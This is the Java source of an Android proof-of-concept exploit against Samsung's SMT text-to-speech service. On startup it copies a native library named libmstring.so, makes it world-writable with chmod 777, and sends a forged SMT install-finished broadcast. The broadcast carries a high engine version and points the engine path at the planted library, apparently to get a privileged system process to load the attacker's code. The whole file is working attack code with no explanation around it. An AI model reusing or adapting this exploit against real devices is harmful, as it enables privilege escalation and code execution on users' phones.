package com.samsung.SMT.lang.poc;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;

public class MyService extends Service {
    public MyService() {
    }


    public void copyfile(String input, String output) throws IOException {

        OutputStream myOutput = new FileOutputStream(output);
        byte[] buffer = new byte[1024];
        int length;
        InputStream myInput = new FileInputStream(input);
        while ((length = myInput.read(buffer)) > 0) {
            myOutput.write(buffer, 0, length);
        }
        myInput.close();
        myOutput.flush();
        myOutput.close();

    }
    @Override
    public void onCreate() {
        super.onCreate();

        Log.e("FUCK", "service created");

        final String path = "/data/app/com.samsung.SMT.lang.poc-ILVI78QqQZJs35VkUAQajA==/lib/arm64-v8a/libmstring.so";

        final String input = this.getApplicationInfo().nativeLibraryDir + "/" + "libmstring.so";
        final String output = "/data/data/com.samsung.SMT.lang.poc/libmstring.so";
        Log.e("FUCK", "so path " + input);
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    copyfile(input, output);
                    Runtime.getRuntime().exec("chmod 777 " + output);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                Intent bi = new Intent();
                bi.setAction("com.samsung.SMT.ACTION_INSTALL_FINISHED");
                ArrayList<CharSequence> s = new ArrayList<>();
                bi.putCharSequenceArrayListExtra("BROADCAST_CURRENT_LANGUAGE_INFO", s);
                bi.putExtra("BROADCAST_CURRENT_LANGUAGE_VERSION", "99999");
                bi.putCharSequenceArrayListExtra("BROADCAST_DB_FILELIST", s);
                bi.putExtra("SMT_ENGINE_VERSION", 0x2590cd5b);//installed version is 361811291
                bi.putExtra("SMT_ENGINE_PATH", input);
                sendBroadcast(bi);
            }
        });
        thread.start();

    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
